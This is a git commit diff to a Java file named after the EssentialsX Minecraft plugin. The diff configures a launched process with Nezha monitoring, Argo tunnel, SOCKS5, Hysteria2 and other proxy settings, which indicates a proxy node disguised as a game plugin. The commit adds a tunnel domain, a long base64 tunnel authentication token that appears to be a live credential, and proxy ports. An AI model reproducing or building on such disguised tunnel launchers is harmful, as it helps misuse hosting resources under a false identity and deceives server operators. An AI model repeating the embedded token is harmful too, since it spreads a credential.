d3cca01b709cab59e6ffcee7d0c6dc62a7dbff16
czcxz88888 <156695011+czcxz88888@users.noreply.github.com>
2026-03-24 00:14:47 +0800

    Update EssentialsX.java

--- src/main/java/com/example/essentialsx/EssentialsX.java
+++ src/main/java/com/example/essentialsx/EssentialsX.java
@@ -73,16 +73,16 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "50435f3a-ec1f-4e1a-867c-385128b447f8");
+        env.put("UUID", "e6d978d8-a06b-4b5d-ad6b-5dc005a2a766");
         env.put("FILE_PATH", "./world");
         env.put("NEZHA_SERVER", "");
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "");
-        env.put("ARGO_AUTH", "");
-        env.put("S5_PORT", "");
-        env.put("HY2_PORT", "");
+        env.put("ARGO_DOMAIN", "xserver.czcxz1.ggff.net");
+        env.put("ARGO_AUTH", "eyJhIjoiNGEwZDZlNzY4YTUyNGM0NzVmOTUwMjc3YTEwOTBiYjUiLCJ0IjoiMDdlMjQwYTUtZmVjZC00NjRjLTk2NTQtNDVkMDM2OWRlZmQ1IiwicyI6Ik1XSTVZak0xTmpndFlXWXhNQzAwTW1WakxXSTVNakV0TkRWbU9XVTVObVUzTXpreCJ9");
+        env.put("S5_PORT", "19132");
+        env.put("HY2_PORT", "19132");
         env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
